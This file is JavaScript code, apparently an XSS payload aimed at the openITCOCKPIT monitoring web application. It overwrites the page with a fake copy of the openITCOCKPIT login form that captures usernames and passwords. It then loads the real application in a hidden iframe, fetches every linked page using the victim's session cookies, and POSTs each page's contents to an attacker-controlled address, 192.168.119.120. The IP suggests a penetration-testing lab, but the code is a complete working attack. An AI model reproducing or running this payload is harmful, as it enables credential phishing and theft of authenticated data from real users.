html_element = document.getElementsByTagName("html")[0]
html_element.innerHTML = '<!DOCTYPE html><html lang="en"><head> <!--[if IE]> <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> <![endif]--> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <meta name="viewport" content="width=device-width, initial-scale=1"> <title> Login - open source system monitoring </title> <link href="/favicon.ico?v3.7.3" type="image/x-icon" rel="icon"/><link href="/favicon.ico?v3.7.3" type="image/x-icon" rel="shortcut icon"/> <link rel="stylesheet" type="text/css" href="/css/vendor/bootstrap/css/bootstrap.min.css?v3.7.3"/> <link rel="stylesheet" type="text/css" href="/smartadmin/css/font-awesome.min.css?v3.7.3"/> <link rel="stylesheet" type="text/css" href="/css/login.css?1648358638"/> <script type="text/javascript" src="/frontend/js/lib/jquery.min.js?v3.7.3"></script> <script type="text/javascript" src="/js/lib/particles.min.js?v3.7.3"></script> <script type="text/javascript" src="/js/login.js?1648358638"></script></head><body class="main"> <div class="login-screen"> <figure> <figcaption>Photo by SpaceX on Unsplash</figcaption> </figure> <figure> <figcaption>Photo by NASA on Unsplash</figcaption> </figure> </div><div class="container-fluid"> <div class="row"> <div id="particles-js" class="col-xs-12 col-sm-6 col-md-7 col-lg-9"></div> </div></div><div class="login-center"> <div class="min-height container-fluid"> <div class="row"> <div class="col-xs-12 col-sm-6 col-md-5 col-lg-3 col-sm-offset-6 col-md-offset-7 col-lg-offset-9"> <div class="login" id="card"> <div class="login-alert"> </div> <div class="login-header"> <h1>openITCOCKPIT</h1> <h4>Open source system monitoring</h4> </div> <div class="login-form-div"> <div class="front signin_form"> <p>Login</p> <form action="/login/login" novalidate="novalidate" id="login-form" class="login-form" method="post" accept-charset="utf-8"><div style="display:none;"><input type="hidden" name="_method" value="POST"/></div> <div class="form-group"> <div class="input-group"> <input name="data[LoginUser][username]" class="form-control" placeholder="Type your email or username" inputDefaults=" " type="text" id="LoginUserUsername"/> <span class="input-group-addon"> <i class="fa fa-lg fa-user"></i> </span> </div> </div> <div class="form-group"> <div class="input-group"> <input name="data[LoginUser][password]" class="form-control" placeholder="Type your password" inputDefaults=" " type="password" id="LoginUserPassword"/> <span class="input-group-addon"> <i class="fa fa-lg fa-lock"></i> </span> </div> </div> <div class="checkbox"> <div class="checkbox"><input type="hidden" name="data[LoginUser][remember_me]" id="LoginUserRememberMe_" value="0"/><label for="LoginUserRememberMe"><input type="checkbox" name="data[LoginUser][remember_me]" class="" value="1" id="LoginUserRememberMe"/> Remember me on this computer</label></div> </div> <div class="form-group sign-btn"> <button type="submit" class="btn btn-primary pull-right"> Sign in </button> </div> </form> </div> </div> </div> </div> </div> </div></div><div class="footer"> <div class="container-fluid"> <div class="row pull-right"> <div class="col-xs-12"> <a href="https://openitcockpit.io/" target="_blank" class="btn btn-default"> <i class="fa fa-lg fa-globe"></i> </a> <a href="https://github.com/it-novum/openITCOCKPIT" target="_blank" class="btn btn-default"> <i class="fa fa-lg fa-github"></i> </a> <a href="https://twitter.com/openITCOCKPIT" target="_blank" class="btn btn-default"> <i class="fa fa-lg fa-twitter"></i> </a> </div> </div> </div></div><div class="container"> <div class="row"> <div class="col-xs-12"> </div> </div></div></body></html>'

var iframe = document.createElement('iframe'); 
iframe.setAttribute("style","display:none") 
iframe.onload = actions;
iframe.width = "100%" 
iframe.height = "100%" 
iframe.src = "https://openitcockpit" 
body = document.getElementsByTagName('body')[0];
body.appendChild(iframe) 

function actions(){ 
    setTimeout(function(){getContent() }, 5000);
}

function getContent(){ 
    allA = iframe.contentDocument.getElementsByTagName("a") 
    allHrefs = [] 
    for (var i=0; i<allA.length; i++){ 
        allHrefs.push(allA[i].href)
    }
    uniqueHrefs = _.unique(allHrefs)
    validUniqueHrefs = [] 
    for(var i=0; i<uniqueHrefs.length; i++) { 
        if (validURL(uniqueHrefs[i])){ 
            validUniqueHrefs.push(uniqueHrefs[i]);
        }
    }
  
    validUniqueHrefs.forEach(href =>{ 
        fetch(href, { 
           "credentials": "include", 
           "method": "GET", 
        }) 
        .then((response) => { 
           return response.text() 
        }) 
        .then(function (text){ 
            fetch("https://192.168.119.120/content", { 
               body: "url=" + encodeURIComponent(href) + "&content=" + encodeURIComponent(text), headers: { 
               "Content-Type": "application/x-www-form-urlencoded" 
               }, 
               method: "POST" 
            }) 
        }); 
    })
}

